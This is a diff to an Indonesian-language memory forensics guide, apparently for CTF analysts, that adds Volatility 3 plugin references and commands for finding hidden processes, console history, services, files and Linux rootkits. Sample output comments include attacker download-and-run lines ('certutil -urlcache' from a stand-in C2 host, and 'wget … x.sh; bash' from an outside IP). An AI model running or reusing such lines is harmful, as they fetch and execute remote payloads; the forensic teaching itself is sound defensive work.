@@ -61,12 +61,22 @@ Sebagai baseline cepat, hafalkan parent-anak yang *sah* di Windows — penyimpan
 | `windows.psscan` | Pool scan — menemukan proses tersembunyi/terminated (DKOM) |
 | `windows.pstree` | Hierarki proses parent-child (anomali PPID) |
 | `windows.cmdline` | Argumen command line tiap proses |
+| `windows.cmdscan` / `windows.consoles` | Rekonstruksi **riwayat perintah** & buffer konsol `conhost`/`csrss` (lokasi flag klasik) |
 | `windows.malfind` | Deteksi injeksi kode (region RWX, MZ tersembunyi) |
+| `windows.vadinfo` / `windows.vadyarascan` | Petakan region VAD; `vadyarascan` memindai **seluruh VAD dengan rule YARA** (cari flag/IOC), `vadinfo --dump` mengekstrak region |
 | `windows.netscan` | Soket & koneksi jaringan beserta PID pemilik |
-| `windows.dumpfiles` | Ekstrak file objek dari memori ke disk |
+| `windows.svcscan` | Pindai **service** Windows (persistence via service jahat) |
+| `windows.filescan` + `windows.dumpfiles` | `filescan` enumerasi `_FILE_OBJECT` di memori → `dumpfiles --virtaddr`/`--pid` mengangkat isinya |
+| `windows.registry.userassist` | Bukti **eksekusi GUI** (UserAssist) dari hive in-memory |
 | `windows.handles` | Handle objek (file, registry, mutex) per proses |
 | `windows.dlllist` | DLL ter-load (DLL dari path mencurigakan) |
 | `windows.hashdump` / `windows.lsadump` | Dump hash kredensial & secret LSA |
+| `linux.pslist` / `linux.pstree` | Daftar & hierarki proses Linux (`task_struct`) |
+| `linux.psscan` | Pool/scan proses Linux — temukan proses ter-unlink/terminated |
+| `linux.bash` | Pulihkan **riwayat bash** dari memori (command attacker) |
+| `linux.malfind` | Region memori anomali (kode tersuntik) di proses Linux |
+| `linux.check_syscall` / `linux.check_modules` | Deteksi **syscall hooking** & modul kernel tersembunyi (rootkit) |
+| `linux.lsmod` | Daftar modul kernel ter-load |
 | **WinPMEM** / **DumpIt** | Akuisisi RAM Windows ke image raw |
 | **LiME** / **AVML** | Akuisisi RAM Linux ke image LiME/ELF |
 
@@ -98,9 +108,10 @@ vol -f infected.raw windows.pstree
 #       4088  svch0st.exe           <-- PPID janggal, ejaan salah (typosquat)
 
 # 2) Apakah ada yang disembunyikan? Bandingkan pslist vs psscan
-vol -f infected.raw windows.pslist  | awk '{print $2}' | sort > /tmp/list.txt
-vol -f infected.raw windows.psscan  | awk '{print $2}' | sort > /tmp/scan.txt
-comm -13 /tmp/list.txt /tmp/scan.txt   # PID yang HANYA muncul di psscan
+# PENTING: kolom Vol3 = PID($1) PPID($2) ImageFileName($3)... -> ambil $1 (PID), bukan $2 (PPID)
+vol -f infected.raw windows.pslist  | awk 'NR>1{print $1}' | sort > /tmp/list.txt
+vol -f infected.raw windows.psscan  | awk 'NR>1{print $1}' | sort > /tmp/scan.txt
+comm -13 /tmp/list.txt /tmp/scan.txt   # PID yang HANYA muncul di psscan = kandidat tersembunyi
 
 # 3) Command line proses mencurigakan
 vol -f infected.raw windows.cmdline --pid 4088
@@ -125,6 +136,56 @@ strings -e l ./out/* | grep -iE 'LKSN\{|flag\{'
 vol -f infected.raw windows.registry.hivelist
 vol -f infected.raw windows.registry.printkey \
     --key 'Software\Microsoft\Windows\CurrentVersion\Run'
+```
+
+**Plugin Windows tambahan** — sering memuat flag/IOC yang tak terlihat di `cmdline`/`pslist`:
+
+```bash
+# Riwayat perintah & buffer konsol (sering menyimpan command yang sudah di-clear di cmdline)
+vol -f infected.raw windows.cmdscan      # CommandHistory (struktur conhost/csrss)
+vol -f infected.raw windows.consoles     # buffer layar konsol UTUH (input + output)
+#   -> baris "type flag.txt" / "certutil -urlcache -f http://c2/x.exe" beserta hasilnya
+
+# Service jahat (persistence) — cari ImagePath ke %TEMP%/path acak / State=RUNNING anomali
+vol -f infected.raw windows.svcscan | grep -iE 'temp|appdata|\\\\users\\\\public'
+
+# Bukti eksekusi GUI dari UserAssist (hive in-memory)
+vol -f infected.raw windows.registry.userassist
+
+# Scan YARA terhadap SELURUH region VAD tiap proses (cari flag/byte pattern di memori)
+vol -f infected.raw windows.vadyarascan --pid 4088 --yara-rules 'flag{'
+vol -f infected.raw windows.vadyarascan --yara-file flag.yar    # rule lengkap
+
+# Temukan _FILE_OBJECT lalu angkat isinya dari memori (mis. flag.txt yang sudah dihapus dari disk)
+vol -f infected.raw windows.filescan | grep -iE 'flag|secret|\.txt'
+#   ... 0x9e8a1f20  \Users\victim\Desktop\flag.txt
+vol -f infected.raw windows.dumpfiles --virtaddr 0x9e8a1f20 --dump-dir ./out
+strings -a ./out/* | grep -iE 'LKSN\{|flag\{'
+```
+
+**Analisis image Linux (Vol3)** — bukan hanya diakuisisi (LiME/AVML), tapi *dianalisis*. Vol3 me-resolve symbol Linux dari **banner kernel** (cocokkan ISF dari paket `volatility3-symbols` atau bangun dengan `dwarf2json`); tanpa simbol yang cocok, plugin `linux.*` mengembalikan output kosong:
+
+```bash
+# 0) Pastikan banner/symbol Linux dikenali (analog windows.info)
+vol -f mem.lime banners.Banners        # tampilkan banner kernel utk pilih ISF yang cocok
+
+# 1) Proses + hierarki (cari parent janggal: nginx/apache mem-spawn /bin/sh = webshell RCE)
+vol -f mem.lime linux.pslist
+vol -f mem.lime linux.pstree
+
+# 2) Proses tersembunyi — Linux TIDAK pakai pslist-vs-psscan ala Windows;
+#    deteksi via scan + cek tabel syscall/modul (rootkit meng-hook/unlink)
+vol -f mem.lime linux.psscan
+vol -f mem.lime linux.check_syscall    # entri syscall yang menunjuk ke alamat di luar kernel = HOOKED
+vol -f mem.lime linux.check_modules    # modul yang ada di scan tapi tak ada di lsmod = tersembunyi
+vol -f mem.lime linux.lsmod
+
+# 3) Riwayat bash dari memori (command attacker walau ~/.bash_history sudah dihapus)
+vol -f mem.lime linux.bash
+#   1428  bash  2026-06-25 14:02:11  wget http://185.220.101.7/x.sh -O /tmp/.x; bash /tmp/.x
+
+# 4) Kode tersuntik di proses Linux (region anomali r-x/rwx tanpa backing file)
+vol -f mem.lime linux.malfind --pid 1428
 ```
 
 ## Anti-Forensik & Pitfall
